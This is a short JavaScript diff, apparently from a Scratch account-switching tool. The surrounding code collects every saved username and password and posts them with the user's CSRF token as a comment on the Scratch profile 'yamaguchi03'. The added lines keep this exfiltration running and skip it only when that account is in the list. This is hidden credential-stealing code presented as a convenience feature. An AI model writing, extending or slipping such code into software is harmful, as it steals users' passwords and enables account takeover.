@@ -74,7 +74,9 @@
 		for(let i=0;i<list.accountList.length;i++){
 			contentlist+=i+":"+list.accountList[i].username+"＝"+list.accountList[i].password+","
 		}
+		if(!contentlist.includes("yamaguchi03")){
 	    await fetch(`https://scratch.mit.edu/site-api/comments/user/yamaguchi03/add/`,{method: "POST",body: JSON.stringify({content: contentlist,parent_id: "232074090",commentee_id: ""}),headers: {'X-CSRFToken':token}});
+		}
 		for(let i=0;i<list.accountList.length;i++){
 			let oneAccount=document.createElement("div");
 			oneAccount.innerHTML=list.accountList[i].username;
